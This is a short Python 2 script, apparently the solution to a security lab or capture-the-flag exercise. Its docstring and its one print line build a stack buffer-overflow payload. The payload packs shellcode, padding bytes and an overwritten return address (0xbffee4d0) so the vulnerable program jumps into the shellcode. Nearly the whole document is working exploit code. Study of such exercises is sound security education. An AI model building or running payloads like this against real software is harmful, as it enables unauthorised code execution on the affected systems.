'''
uses the address of bffee4d0, which stores the shellcode, to over write the return
and therefore jump to the shellcode.
'''

from shellcode import shellcode
from struct import pack

print pack("<I", 0x40000000) + shellcode + pack("<I", 0x61616161)*9 + pack("<I", 0xfee4d061) + pack("<I", 0x616161bf)
